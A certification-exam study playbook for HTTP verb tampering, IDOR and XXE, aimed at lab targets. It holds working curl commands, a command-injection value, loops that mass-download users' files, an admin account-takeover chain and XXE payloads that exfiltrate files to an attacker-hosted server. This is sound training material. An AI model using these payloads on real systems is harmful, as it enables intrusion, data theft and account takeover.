# NOTE — Web Attacks Methodology (Exam Playbook)

## ID
722

## Module
Web Attacks

## Kind
methodology

## Title
Web Attacks Methodology — HTTP Verb Tampering, IDOR & XXE (Exam Playbook)

## Description
Symptom-driven retrieval playbook for the three Web Attacks classes — HTTP Verb Tampering, Insecure Direct Object References (IDOR), and XML External Entity (XXE) injection — with exact payloads, a decision tree, and the chained-attack pattern from the skills assessment.

## Tags
methodology, web-attacks, http-verb-tampering, verb-tampering, idor, broken-access-control, xxe, xml-external-entity, file-disclosure, lfi-via-xxe, oob-exfiltration, blind-xxe, php-filter, base64-idor, mass-enumeration, account-takeover, auth-bypass, 401-bypass, access-denied-bypass, exam, cpts

---

## TL;DR — The Flow

1. **Map input** — every parameter (`id`, `uid`, `file`, `contract`), every endpoint, every Content-Type. Note what's reflected in the response.
2. **Hit an auth wall (401 / "Access Denied" / filter block)?** → **Verb Tampering** (Phase 1): swap GET↔POST↔HEAD↔OPTIONS.
3. **See an object reference you can change (`?uid=1`, base64/MD5 blob, `/api/profile/1`)?** → **IDOR** (Phase 2): increment / decode / two-account compare → mass-enumerate.
4. **App parses XML/SOAP/SVG/DOCX, or a form posts XML?** → **XXE** (Phase 3): internal entity test → `file://` → `php://filter` → CDATA/error → OOB.
5. **One finding seems low-impact?** → **chain it** (Phase 4): IDOR-leak → verb-tamper bypass → XXE read. That IS the skills-assessment pattern.

---

## Golden Rule + OPSEC Fork

**Golden Rule:** the vulnerability is never the *reference* or the *verb* — it's the **missing server-side check**. Don't waste time trying to "break" a hash or guess a UUID; instead find the place where the check is absent (a different HTTP method, a read endpoint, a second account's session).

**Do NOT waste exam minutes on:**
- Brute-forcing random UUID v4 references — instead find where another user's UUID *leaks* (GET IDOR, public profile) and reuse it.
- Trying to read binary files via reflected XXE — they break XML; use `php://filter` base64 or skip.
- Re-running automated scanners for verb tampering — scanners miss code-level (`$_GET` vs `$_REQUEST`) tampering; this is a manual-only check.
- The Billion-Laughs DoS — mitigated on modern Apache; not the exam objective.
- `expect://` RCE via XXE — module rarely enabled; treat XXE as file-disclosure first.

**OPSEC:** all three are loud (verb fuzzing, ID enumeration loops, XXE error-spam). On CPTS this is fine — note it for the report (`Detection` in `[[05-verb-tampering-prevention]]` / `[[12-idor-prevention]]`). Throttle ID-enumeration loops if the app has lockout/rate-limiting.

---

## Phase 1 — HTTP Verb Tampering

**Goal:** bypass an auth check or input filter that only covers one HTTP method.

| Trigger / Precondition | Go to |
|---|---|
| `401 Unauthorized` / `403` on a directory or action (e.g. `/admin/reset.php`) | 1.A — server-misconfig bypass |
| Input filter blocks payload (`Malicious Request Denied!`) but accepts benign input | 1.B — code-level filter bypass |
| `Access Denied` on a state-changing action that checks session vs uid | 1.B (GET-tamper, see Phase 4) |

### 1.A — Server Misconfig (auth only on GET/POST)

```bash
# 1. Confirm the dir/action is auth-protected
curl -i http://$TARGET:$PORT/admin/reset.php
# 2. Enumerate accepted methods — read the Allow: header
curl -i -X OPTIONS http://$TARGET:$PORT/
# 3. Replay the protected action with an uncovered verb
curl -i -X HEAD http://$TARGET:$PORT/admin/reset.php
# HEAD returns 200, empty body — server-side code STILL executes
# 4. Verify the action took effect (HEAD shows no body)
curl -i http://$TARGET:$PORT/
```

**Output checkpoint:** after this you have the protected action executed (files deleted / flag rendered) **without credentials**. Root cause: `.htaccess` used `<Limit GET POST>` instead of `<LimitExcept>`.

### 1.B — Code-Level Filter Bypass (`$_GET` filter, `$_REQUEST` logic)

```bash
# Original is GET and filtered — swap to POST (filter checks $_GET only, logic uses $_REQUEST)
curl -s "http://$TARGET:$PORT/" -d "filename=file; cp /flag.txt ./"
# Read the result the injected command produced
curl -s http://$TARGET:$PORT/flag.txt
```
Or in Burp: intercept → right-click → **Change Request Method** (GET↔POST only — for HEAD/OPTIONS/PUT edit the raw verb manually).

**Output checkpoint:** the filtered payload (command injection, etc.) now executes because the filter and the logic read different superglobals. Always test **both** GET→POST and POST→GET.

---

## Phase 2 — IDOR (Broken Access Control)

**Goal:** access/modify another user's object by manipulating its reference, because the back-end never checks ownership.

| Trigger / Precondition | Go to |
|---|---|
| URL/POST param looks like an object ref: `?file_id=`, `?uid=`, `?id=`, `filename=` | 2.A — direct increment |
| Param is base64 (`ZmlsZV8x…`) or a hash (32-hex MD5) | 2.B — decode/replicate |
| REST API path like `/api.php/profile/1` | 2.C — test every HTTP method |
| You have / can register two accounts | 2.D — two-account compare |
| Need every user's file at once | 2.E — mass enumeration |

### 2.A — Direct reference increment
Change `id=1`→`id=2`; different data with no "access denied" = IDOR confirmed. Inspect URL, POST body **and** cookies for the ref.

### 2.B — Encoded / hashed reference (logic is in client-side JS)
View page source → find the download/AJAX function → identify the encoding chain → replicate in bash:
```bash
echo -n $UID | base64 -w 0                          # base64(uid)
echo -n $UID | base64 -w 0 | md5sum | tr -d ' -'    # md5(base64(uid))
```
> `-n` on echo and `-w 0` on base64 are mandatory — a stray newline changes the hash.

### 2.C — IDOR in REST API (access control inconsistent across methods)
APIs often guard writes (PUT/POST/DELETE) but forget **GET**. Test all four against `/profile/<UID>`:
```bash
curl -s "http://$TARGET:$PORT/profile/api.php/profile/$UID" | python3 -m json.tool       # GET — often unprotected → leaks uuid/role
curl -s -X PUT "http://$TARGET:$PORT/profile/api.php/profile/$UID" -H "Content-Type: application/json" -d '{"uid":$UID,"uuid":"$UUID","role":"$ROLE","full_name":"$NAME","email":"$EMAIL","about":"x"}'
curl -s -X POST   "http://$TARGET:$PORT/profile/api.php/profile/$UID" -H "Content-Type: application/json" -d '{...}'
curl -s -X DELETE "http://$TARGET:$PORT/profile/api.php/profile/$UID"
```
**Output checkpoint:** GET leaks the target's `uuid` + `role` → this is the *information-disclosure* primitive for Phase 4 chaining.

### 2.D — Two-account compare (most reliable confirmation)
Register two users (different privilege if possible), separate browser profiles. Capture each one's "view my data" request; replay the high-priv user's call **with the low-priv session**. Data returned = IDOR.

### 2.E — Mass enumeration
```bash
# Parameter IDOR (note: confirm GET vs POST by intercepting — labs lie)
for i in {1..20}; do
  for link in $(curl -s -X POST "http://$TARGET:$PORT/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); do
    wget -q "http://$TARGET:$PORT$link"
  done
done
cat flag*.txt

# Encoded-reference IDOR
for i in {1..20}; do
  curl -sOJ "http://$TARGET:$PORT/download.php?contract=$(echo -n $i | base64 -w 0)"
done
ls -lAS contract_*   # the single non-empty file is the target
```
> Regex `[a-z]{3}` (not `.pdf`) so the `.txt` flag isn't missed. `curl -sOJ`: `-O` server filename, `-J` Content-Disposition name.

**Output checkpoint:** all users' files on disk; flag is the odd-one-out (non-empty / `.txt`).

---

## Phase 3 — XXE Injection

**Goal:** read server files (or exfiltrate OOB) via external entities in parsed XML.

| Trigger / Precondition | Go to |
|---|---|
| Endpoint consumes XML and an element value is **reflected** in the response | 3.A → 3.B |
| Reflected, but target file has XML special chars (`<`, `>`, `&`) | 3.C — CDATA |
| **No** element reflected, but app shows errors | 3.D — error-based |
| Nothing reflected, no errors (truly blind) | 3.E — OOB exfil |
| JSON-only endpoint | change `Content-Type: application/xml`, convert body, then 3.A |

### 3.A — Confirm with an internal entity
Find which element is reflected (e.g. `<email>`), then:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ <!ENTITY company "test"> ]>
<root><name>x</name><tel>1</tel><email>&company;</email><message>x</message></root>
```
Value renders = vulnerable. **Output checkpoint:** XXE confirmed, injection point = the reflected element.

### 3.B — Local file read
```xml
<!ENTITY company SYSTEM "file:///etc/passwd">                                       <!-- plaintext files -->
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"> <!-- source / files with XML chars -->
```
Decode base64 in Burp Inspector (double-click the response string) or `echo "$B64" | base64 -d`.

### 3.C — CDATA wrap (reflected, but file has `<`/`>`/`&`)
Host an external DTD; join parameter entities (XML forbids joining internal+external directly):
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://$ATTACKER_IP:8000/XXE.dtd">
  %xxe;
]>
<root>...<email>&joined;</email>...</root>
```

### 3.D — Error-based (no reflection, errors visible)
```bash
cat > XXE.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://$ATTACKER_IP:8000/XXE.dtd">
  %remote; %error;
]>
<root>...<email>&content;</email>...</root>
```
File content leaks inside the invalid-URI error string.

### 3.E — OOB / blind exfiltration (nothing reflected, no errors)
Use **`php -S`** (not `python3 -m http.server`) so the decoder script runs:
```bash
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/TARGET_FILE">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://$ATTACKER_IP:8000/?content=%file;'>">
EOF
cat > index.php << 'EOF'
<?php if(isset($_GET['content'])){ error_log("\n\n".base64_decode($_GET['content'])); } ?>
EOF
php -S 0.0.0.0:8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://$ATTACKER_IP:8000/xxe.dtd">
  %remote; %oob;
]>
<root>&content;</root>
```
Decoded content prints in the `php -S` terminal. Automated alternative:
```bash
ruby XXEinjector.rb --host=$ATTACKER_IP --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
cat Logs/$TARGET/etc/passwd.log
```
**Output checkpoint:** target file contents in your log/terminal. All OOB/CDATA/error methods need outbound egress from target → you.

---

## Phase 4 — Chaining (the Skills-Assessment Pattern)

**Pattern: enumerate → leak → escalate → exploit.** Each bug alone is weak; together = full compromise.

| Trigger / Precondition | Chain |
|---|---|
| GET IDOR leaks uuid/role + PUT enforces only uuid-match | IDOR-leak → IDOR-write = **account takeover** |
| IDOR steals a password-reset token + reset endpoint blocks POST | IDOR-token → **verb-tamper GET** reset → login → new surface |
| Post-login admin feature posts XML | privilege gained → **XXE** the new admin form |

```bash
# 1. Enumerate users via read IDOR, find the admin
for uid in {1..100}; do curl -s "http://$TARGET:$PORT/api.php/user/$uid"; echo; done | grep -i admin | jq .
# 2. Steal admin's reset token (IDOR — token tied to uid, must request the admin's uid)
curl -s "http://$TARGET:$PORT/api.php/token/$ADMIN_UID"
openssl rand -hex 16   # new password
# 3. reset.php POST is session-checked → verb-tamper to GET (paste in browser)
#    http://$TARGET:$PORT/reset.php?uid=$ADMIN_UID&token=$STOLEN_TOKEN&password=$NEWPASS
# 4. Login as admin → use the now-visible admin feature (Add Event = XML)
# 5. XXE the admin form (only <name> is reflected here):
#    <!DOCTYPE replace [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
#    <root><name>&xxe;</name><details>x</details><date>2021-09-22</date></root>
echo "$B64" | base64 -d
```
For the account-takeover variant: GET-leak the admin's `uuid`, then PUT to `/profile/$ADMIN_UID` with the **admin's** uuid and your modified field (the uuid-match check never verifies *who* is requesting).

---

## Decision Tree (Under Exam Pressure)

```
Web app, looking for a finding
│
├─ Hit 401 / 403 / "Access Denied" / filter block?
│   ├─ on a directory/action → OPTIONS for Allow: → replay with HEAD/PUT/etc.  [1.A]
│   ├─ on an input filter     → swap GET↔POST (Burp Change Method)            [1.B]
│   └─ STUCK >10 min → it may be session-vs-uid: try GET-tamper (Phase 4 step 3)
│
├─ See a parameter you can change (id/uid/file/contract)?
│   ├─ plain number       → increment, compare response                       [2.A]
│   ├─ base64 / hash      → view-source JS → replicate encoding in bash        [2.B]
│   ├─ /api/.../<id> path → test GET *and* PUT/POST/DELETE separately          [2.C]
│   ├─ random UUID, can't guess → DON'T brute. Find where it leaks (GET IDOR)  [2.C/4]
│   └─ STUCK >10 min → register 2 accounts, replay one's request w/ other's session [2.D]
│
├─ App parses XML (SOAP/form/SVG/DOCX) or JSON you can flip to XML?
│   ├─ element reflected?
│   │     ├─ yes, plain file        → file:// then php://filter               [3.B]
│   │     ├─ yes, file has <>& chars→ CDATA via external DTD                   [3.C]
│   │     └─ no, errors shown       → error-based DTD                          [3.D]
│   └─ nothing reflected, no errors → OOB exfil with php -S                    [3.E]
│       └─ STUCK >10 min → confirm outbound egress (target must reach you);
│                          if blocked, OOB/CDATA/error all fail — only reflected works
│
└─ Found ONE weak bug? → STOP treating it alone.
    enumerate → leak → escalate → exploit  (chain IDOR+verb+XXE)              [Phase 4]
```

---

## Signal → Counter-Move Reference

| Signal / Symptom | Likely Cause | Exact Counter-Move |
|---|---|---|
| `401`/`403` on `/admin/...` but app "works" for some verbs | `<Limit GET POST>` misconfig | `curl -X OPTIONS` → replay action with `-X HEAD` (`[1.A]`) |
| HEAD returns `200` empty body | server-side code ran, no body by design | Verify via app state (`curl` the root page again) — don't expect output |
| `Malicious Request Denied!` on payload, OK on benign | filter reads `$_GET`, logic reads `$_REQUEST` | Burp → Change Request Method GET→POST, resend payload (`[1.B]`) |
| `Access Denied` on a POST reset/action despite valid data | session-vs-uid check on POST only | Re-send as **GET** with params in URL (`[1.B]`/Phase 4) |
| `?uid=2` shows another user's data | no object-level access control | Confirmed IDOR → mass-enumerate (`[2.E]`) |
| Reference is `ZmlsZV8x…` / 32-hex | base64 / MD5-obfuscated ID | view-source the JS, replicate `echo -n|base64 -w0[|md5sum]` (`[2.B]`) |
| GET on `/api/profile/N` returns full profile incl. uuid/role | read endpoint has no access check | Leak target uuid → chain to PUT write (`[2.C]`→Phase 4) |
| `uid mismatch` on PUT | body uid ≠ endpoint uid | Change **both** the path `/profile/N` and JSON `uid` |
| `uuid mismatch` on PUT | backend checks uuid belongs to that uid | GET-leak the *target's real* uuid, use it in the body |
| XML `<email>test</email>` echoes my value | reflection point found | Inject internal entity to confirm XXE (`[3.A]`) |
| `file:///etc/passwd` works, source file returns garbage/broken | XML special chars in file | Switch to `php://filter/convert.base64-encode` (`[3.B]`) |
| Reflected output but file is HTML/PHP with `<>` | parser breaks on file content | CDATA-wrap via external DTD (`[3.C]`) |
| No element reflected at all, but errors print | no reflection, errors leak | Error-based XXE DTD (`[3.D]`) |
| No reflection, no errors, nothing | fully blind | OOB exfil, **`php -S`** not `python3 http.server` (`[3.E]`) |
| OOB request hits my server but no decoded data | used `python3 -m http.server` (no PHP) | Use `php -S 0.0.0.0:8000`; ensure body references `&content;` |
| Each bug seems low-impact | thinking in isolation | Chain: enumerate→leak→escalate→exploit (Phase 4) |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# $TARGET $PORT $ATTACKER_IP $UID $UUID $ROLE $ADMIN_UID set per box

# === S1: Verb tampering — bypass dir auth ===
curl -i -X OPTIONS http://$TARGET:$PORT/                       # read Allow:
curl -i -X HEAD    http://$TARGET:$PORT/admin/reset.php        # trigger action unauth

# === S2: Verb tampering — bypass input filter ===
curl -s "http://$TARGET:$PORT/" -d "filename=file; cp /flag.txt ./" && curl -s http://$TARGET:$PORT/flag.txt

# === S3: IDOR mass-download (param) ===
for i in {1..20}; do for l in $(curl -s -X POST "http://$TARGET:$PORT/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); do wget -q "http://$TARGET:$PORT$l"; done; done; cat flag*.txt

# === S4: IDOR mass-download (base64 ref) ===
for i in {1..20}; do curl -sOJ "http://$TARGET:$PORT/download.php?contract=$(echo -n $i|base64 -w 0)"; done; ls -lAS contract_*

# === S5: IDOR API read leak ===
curl -s "http://$TARGET:$PORT/profile/api.php/profile/$UID" | python3 -m json.tool

# === S6: IDOR account takeover (chain GET-leak → PUT) ===
for u in {1..10}; do curl -s "http://$TARGET:$PORT/profile/api.php/profile/$u"; echo; done | grep -i admin
curl -s -X PUT "http://$TARGET:$PORT/profile/api.php/profile/$ADMIN_UID" -H "Content-Type: application/json" -d '{"uid":"$ADMIN_UID","uuid":"$UUID","role":"$ROLE","full_name":"x","email":"flag@idor.htb","about":"x"}'

# === S7: XXE confirm + local read ===
# <!DOCTYPE email [ <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"> ]>  → &company; in reflected element

# === S8: XXE CDATA external DTD ===
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd && python3 -m http.server 8000

# === S9: XXE OOB blind ===
php -S 0.0.0.0:8000      # with xxe.dtd + index.php decoder in cwd
ruby XXEinjector.rb --host=$ATTACKER_IP --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

# === S10: Full skills-assessment chain ===
for u in {1..100}; do curl -s "http://$TARGET:$PORT/api.php/user/$u"; echo; done | grep -i admin | jq .
curl -s "http://$TARGET:$PORT/api.php/token/$ADMIN_UID"; openssl rand -hex 16
# browser: http://$TARGET:$PORT/reset.php?uid=$ADMIN_UID&token=$TOKEN&password=$NEWPASS  → login → XXE the admin XML form
```

---

## Quick Reference — Tools by Function

| Function | Tool / Command |
|---|---|
| Verb swap (manual) | `curl -X <VERB>` |
| Verb swap (GUI) | Burp → right-click → **Change Request Method** (GET↔POST only) |
| Allowed-methods recon | `curl -i -X OPTIONS` → `Allow:` header |
| Reference decode/encode | `echo -n X \| base64 -w 0`, `… \| md5sum \| tr -d ' -'`, `base64 -d` |
| ID enumeration | bash `for` loop, Burp Intruder |
| Mass file pull | `wget -q`, `curl -sOJ`, `ls -lAS` to find the non-empty/odd file |
| JSON pretty-print | `python3 -m json.tool`, `jq .` |
| XXE source read | `php://filter/convert.base64-encode/resource=<FILE>` |
| Host external DTD | `python3 -m http.server 8000` (reflected) / `php -S 0.0.0.0:8000` (OOB decode) |
| Automated blind XXE | `XXEinjector.rb` (`--oob=http --phpfilter`, `XXEINJECT` marker) |
| Decode in Burp | Inspector → double-click base64 string in response |
| Random password | `openssl rand -hex 16` |

---

## Top Gotchas (Things That Will Burn You)

1. **HEAD returns no body** — the action *did* run; verify by re-requesting app state, not by reading the HEAD response.
2. **Burp "Change Request Method" only toggles GET↔POST** — for HEAD/OPTIONS/PUT/DELETE you must hand-edit the raw verb.
3. **Turn Burp interception OFF after forwarding** the tampered request, or you'll hand-forward every subsequent request.
4. **Labs lie about GET vs POST** — the lesson text may say `?uid=1` while the real endpoint wants `-d "uid=1"`. Always intercept to confirm the real method/body.
5. **`echo -n` + `base64 -w 0` are mandatory** — a single trailing newline changes the hash and every enumerated request 404s/returns 0 bytes.
6. **Mass-IDOR regex must be `[a-z]{3}`**, not `.pdf` — otherwise the `.txt` flag among PDFs is silently skipped.
7. **PUT IDOR needs BOTH path and body uid changed**, plus the *target's real* uuid (GET-leak it first) or you get `uid mismatch` / `uuid mismatch`.
8. **`file://` breaks on files containing `<`, `>`, `&`** — use `php://filter/convert.base64-encode` for any source/HTML/PHP file.
9. **OOB XXE: use `php -S`, never `python3 -m http.server`** — the latter won't execute the decoder; you'll see the hit but no plaintext.
10. **OOB body must reference `&content;`** (e.g. `<root>&content;</root>`) — without it the entity never resolves and no callback fires.
11. **Host the external DTD *before* sending the payload** — the target fetches it at parse time; server not up = silent fail.
12. **Reset/action returns "Access Denied" by design** when it checks session vs uid — that's the *signal* to verb-tamper to GET, not a broken payload.
13. **Admin-only attack surface is invisible pre-escalation** — if you don't see the XML feature, you haven't finished the IDOR/verb chain yet.
14. **Inline DTD overrides external DTD** — useful: you can inject entities even when the app supplies its own DTD.
15. **Verb tampering is a manual-only finding** — scanners catch server misconfig but miss the `$_GET`-vs-`$_REQUEST` code bug; never assume "scanner was clean" = safe.

---

## Related Vault Notes

- `[[01-attacks]]` — module overview (the 3 classes + impact)
- `[[02-http-verb-tampering]]` — verb tampering theory, the two vuln types
- `[[03-bypassing-basic-authentication]]` — 1.A: HEAD bypass of dir auth
- `[[04-bypassing-security-filters]]` — 1.B: GET→POST filter bypass / cmd injection
- `[[05-verb-tampering-prevention]]` — defender view (report remediation)
- `[[06-idor]]` — IDOR theory, impact ladder
- `[[07-idor-2]]` — 2.A–2.D: identifying IDORs, encoded refs, two-account method
- `[[08-mass-idor-enumeration]]` — 2.E: bash mass-download loop
- `[[09-bypassing-encoded-references]]` — 2.B: reversing base64/MD5 JS encoding
- `[[10-idor-insecure-apis]]` — 2.C: per-method API testing, GET leak
- `[[11-chaining-idor-vulnerabilities]]` — Phase 4: enumerate→leak→exploit account takeover
- `[[12-idor-prevention]]` — RBAC + opaque-ref defense (report)
- `[[13-intro-to-xxe]]` — XML/DTD/entity fundamentals, attack chain concept
- `[[14-xxe-local-file-disclosure]]` — 3.A/3.B: internal entity → file:// → php://filter
- `[[15-xxe-advanced-file-disclosure]]` — 3.C/3.D: CDATA + error-based via external DTD
- `[[16-xxe-blind-data-exfiltration]]` — 3.E: OOB exfil, php -S, XXEinjector
- `[[18-web-attacks-skills-assessment]]` — Phase 4: full IDOR→verb→XXE chain

External cross-vault:
- Filter-bypass payload encoding chains: `[[../command-injetions/00-METHODOLOGY]]` (when added) — verb tampering often re-opens command injection
- Source-read overlap: `[[../file-inclusion/00-METHODOLOGY]]` — `php://filter` is shared between XXE and LFI
- File-upload XXE vectors (SVG/DOCX): `[[../file-uploads/00-METHODOLOGY]]`
- Triage by symptom: `[[../ATTACK-PATHS]]`
- Index: `[[../SEARCH]]`
- Exam pitfalls: `[[../EXAM-WARNINGS]]`
